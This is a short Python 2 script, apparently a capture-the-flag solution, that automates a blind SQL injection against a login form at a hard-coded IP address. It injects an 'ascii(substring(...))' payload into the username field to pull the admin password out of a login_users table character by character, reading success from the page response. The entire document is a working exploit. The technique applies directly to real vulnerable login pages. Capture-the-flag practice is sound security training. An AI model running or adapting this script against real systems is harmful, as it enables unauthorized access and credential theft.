import urllib,urllib2
charset=[48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 97, 98, 99, 100, 101, 102]
flag="flag{"
url="http://103.10.24.99/66ee606d5019d75f83836eeb295c6b6f/login.php"
print "[+] Vuln URL: "+url+"\n"
for i in range(6,38):
	for j in charset:
		va={"username":"admin' and ascii(substring((select password from login_users where username='admin'),"+str(i)+",1))="+str(j)+") #","password":"rgukt123"}
		data = urllib.urlencode(va)
		req = urllib2.Request(url, data)
		response = urllib2.urlopen(req)
		html = response.read()
		if "success" in html:
			print "[+] Congrats! Found %d letter of flag and it is : %c \n"%(i-5,chr(j))
			flag+=chr(j)
			break
		else:
			print "[-] Checked %d letter of flag with %c \n"%(i-5,chr(j))
flag+="}"
print "[+] Pawned ! Here is your Flag : %s \n"%(flag)
